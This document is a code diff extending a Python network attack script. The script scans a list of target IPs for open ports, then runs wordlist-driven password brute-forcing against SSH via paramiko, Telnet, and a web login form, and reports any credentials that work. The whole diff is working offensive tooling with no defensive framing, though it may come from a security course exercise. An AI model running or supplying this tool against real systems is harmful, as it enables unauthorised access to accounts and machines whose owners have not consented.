@@ -4,6 +4,8 @@ from scapy.all import *
 from os import path
 from shutil import copyfile
 from telnetlib import Telnet
+from paramiko import SSHClient, AutoAddPolicy
+from requests import get, post
 
 conf.verb = 0
 
@@ -11,10 +13,7 @@ conf.verb = 0
 def main():
     arguments = sys.argv[1:]
     number_of_arguments = len(arguments)
-    if number_of_arguments < 8:
-        help()
-
-    if "-t" not in arguments or "-p" not in arguments or "-u" not in arguments or "-f" not in arguments:
+    if number_of_arguments < 8 or "-t" not in arguments or "-p" not in arguments or "-u" not in arguments or "-f" not in arguments:
         help()
 
     ip_file = arguments[arguments.index("-t") + 1]
@@ -35,13 +34,21 @@ def main():
 
     for ip in ip_list:
         for port in port_list:
+            print("********** %s **********" % ip)
             port_open = scan_port(ip, port)
             print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
             if port_open:
+                response = ""
+
                 if port == 22:
-                    pass
+                    response = bruteforce_ssh(ip, port, username, password_file)
                 elif port == 23:
-                    bruteforce_telnet(ip, port, username, password_file)
+                    response = bruteforce_telnet(ip, port, username, password_file)
+                elif port == 80:
+                    response = bruteforce_web(ip, port, username, password_file)
+                 
+                if response:
+                    print("Successfully logged into port %d with %s" % (port, response))
 
 
 def scan_port(ip, port):
@@ -54,6 +61,8 @@ def scan_port(ip, port):
 
 
 def bruteforce_telnet(ip, port, username, password_list_filename):
+    response = ""
+
     login_prompt = encode_in_ascii("login:")
     username_input = encode_in_ascii("%s\n" % username)
     password_prompt = encode_in_ascii("Password:")
@@ -69,11 +78,51 @@ def bruteforce_telnet(ip, port, username, password_list_filename):
             connection.write(encode_in_ascii(password))
             banner = connection.read_until(welcome_output, timeout=1)
             if welcome_output in banner:
-                print("We're in")
-            else:
-                print(connection.read_all())
-            #print(connection.read_all().decode("ascii"))
+                connection.close()
+                response = "%s:%s" % (username, password.rstrip())
+                break
+
             connection.close()
+
+    return response
+
+
+def bruteforce_ssh(ip, port, username, password_list_filename):
+    response = ""
+    with open(password_list_filename) as reader:
+        passwords = reader.readlines()
+        for password in passwords:
+            password_clean = password.rstrip()
+            try:
+                client = SSHClient()
+                client.set_missing_host_key_policy(AutoAddPolicy())
+                client.connect(ip, username=username, password=password_clean)
+                response = "%s:%s" % (username, password.rstrip())
+                break
+            except Exception: 
+                pass
+            finally:
+                client.close()
+
+    return response
+
+
+def bruteforce_web(ip, port, username, password_list_filename):
+    response = ""
+    base_url = "http://%s:%d" % (ip, port)
+    index_url = "%s/index.php" % base_url
+    login_url = "%s/login.php" % base_url
+    with open(password_list_filename) as reader:
+        passwords = reader.readlines()
+        for password in passwords:
+            password_clean = password.rstrip()
+            index_response = get(index_url)
+            if index_response.status_code == 200: 
+                login_response = post(login_url, data={"username":username, "password":password_clean})
+                if "Welcome" in login_response.text:
+                    response = "%s:%s" % (username, password.rstrip())
+
+    return response
 
 
 def read_ip_list(ip_file):
